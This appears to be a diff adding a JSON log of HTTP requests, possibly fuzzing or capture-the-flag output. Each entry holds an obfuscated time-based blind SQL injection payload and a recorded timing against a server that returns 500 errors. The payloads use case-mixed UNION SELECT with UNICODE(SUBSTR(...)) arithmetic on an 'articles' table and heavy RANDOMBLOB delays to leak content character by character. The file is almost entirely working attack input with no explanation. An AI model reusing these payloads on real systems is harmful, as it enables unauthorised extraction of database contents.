+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3350.817999987349
+  },
+  {
+    "query": "{\"query\":\"0XCE8b' and -1058 uNIon SELECT 0xA884,(SeLeCT caSe wHEn ((seleCt UNICODe(suBsTR(cOnTENT,-40,1)) FrOm ARtIclES wHEre conTENt LiKE '%CJ%')*(selecT uniCODe(SubsTR(cOntENt,0x16,1)) FRoM ArTIclEs wHERe COnTENT lIke '%CJ%')) liKE 2805 THEN hex(rAnDOMBLOb(1000000000/2)) ELSE hEX(ranDoMbLoB(1500000000/2)) ENd),55 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2458.74000002503
+  },
+  {
+    "query": "{\"query\":\"0xdBcd' AnD 2277 union selecT 0X7C74,(sELECT CASe wHeN ((SEleCt UniCODE(SUbstr(cONTEnt,0x5,1)) FRoM arTicLEs WHEre cOnteNT LiKE '%cj%')-(SelecT uniCoDe(subStr(COntenT,0X2A,1)) FrOm arTICLES whErE cOnTeNT lIKe '%cJ%')-(seLeCT UNIcodE(SuBSTR(coNTENT,-5,1)) FRom aRTIclES WheRe coNTEnt lIkE '%CJ%')) lIKE -108 THeN HeX(rAndOMBLob(1500000000/2)) ELSe HEx(RAnDomblOB(1000000000/2)) EnD),-1 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3181.826000030115
+  },
+  {
+    "query": "{\"query\":\"0XA3C8' AND -2148 uNIon sEleCT 0xD43,(SElEct casE wheN (Hex((select UniCODe(SubsTr(CoNTenT,-28,1)) From ArtiCles wheRe CONTEnt LikE '%CJ%')+(SeLECt UNICOdE(SubStR(conteNt,-6,1)) FrOm ARtiCLeS WheRE COnTent lIkE '%cj%'))) lIkE '323031' theN Hex(rAndOmBlob(1000000000/2)) eLsE Hex(rAnDOMBlob(1500000000/2)) END),-14 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2460.0189999926947
+  },
+  {
+    "query": "{\"query\":\"0XcCcb' ANd -1262 UNioN SELect 0x4025,(SeLect Case wHEn (HeX((seLect UnicODE(sUBStR(CoNtent,-48,1)) FRoM ArticleS whERe CONTeNt liKe '%cJ%')-(SeLeCT UNICOdE(SuBStr(ContEnt,-43,1)) FROM aRtIcLES WHERe cOnTEnt lIKE '%CJ%')+(selECt UNIcOde(SubStR(cOntenT,-10,1)) fRoM artIclEs WhERe contENT like '%CJ%'))) likE '3637' THEN HeX(randoMBloB(1000000000/2)) elsE Hex(raNdombLob(1500000000/2)) EnD),75 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2596.303000043556
+  },
+  {
+    "query": "{\"query\":\"0xc75' aND 368 UNioN sElEct 0XABab,(SeleCT casE WHen ((SeLect uNiCODe(SUbsTr(ContenT,0X20,1)) FrOM ArTiCleS WHeRe ConTENT liKe '%CJ%')*(SELeCT unicOde(SUBSTR(ContenT,-36,1)) FroM ARTiCLes Where cONTent LIKe '%CJ%')) lIKe 2800 THEN HEx(RaNDombLoB(1500000000/2)) eLsE HeX(rAndOMblob(1000000000/2)) enD),62 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 3369.8579999945014
+  },
+  {
+    "query": "{\"query\":\"0xA6f8' AnD -383 unIoN SeLecT 0x2076,(sElect casE WHen (heX((selEcT unicOde(sUbStr(conTEnT,0x3,1)) FROM ARticlES WHerE contENt lIkE '%CJ%')-(SElECt uNiCOde(SUBsTR(CONtEnt,-47,1)) From aRticLEs wheRE CONtent LIKe '%cJ%')+(SELEct unICODe(SUBstR(COntent,-1,1)) FroM arTIcLEs WHERe CONteNt lIKe '%Cj%'))) LikE '313031' then Hex(rANdomBloB(1000000000/2)) eLse hEx(RANdomBLoB(1500000000/2)) eNd),-50 -- -\"}",
+    "content": {
+      "size": 265,
+      "mimeType": "text/html",
+      "compression": 0,
+      "text": "<!doctype html>\n<html lang=en>\n<title>500 Internal Server Error</title>\n<h1>Internal Server Error</h1>\n<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>\n"
+    },
+    "time": 2463.7010000161454
+  }
+]
